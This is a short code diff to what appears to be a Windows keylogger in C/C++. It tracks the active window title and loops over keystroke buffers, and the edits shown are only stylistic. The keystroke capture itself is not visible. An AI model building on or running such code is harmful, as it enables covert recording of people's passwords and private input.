@@ -1,7 +1,8 @@
 #define WIN32_LEAN_AND_MEAN
 #include <Windows.h>
-#include <stdio.h>
+#include <cstdio>
 #include "key_controler.h"
+
 
 #define WIN_TITLE_BUFSIZE 1024
 #define STROKE_BUFSIZE 25
@@ -29,14 +30,14 @@ void getActiveWindowTitle(char* title) {
 	}
 
 
-int main(int argc, char* argv[]) {
+int main(int argc, char** argv) {
 	char buff_A[WIN_TITLE_BUFSIZE]="", buff_B[WIN_TITLE_BUFSIZE]="";
 	char *old_win_title, *curr_win_title;
 
 	old_win_title = buff_A;
 	curr_win_title = buff_B;
 
-	while (true) {
+	while (TRUE) {
 		char stroke[STROKE_BUFSIZE];
 
 		Sleep(2);
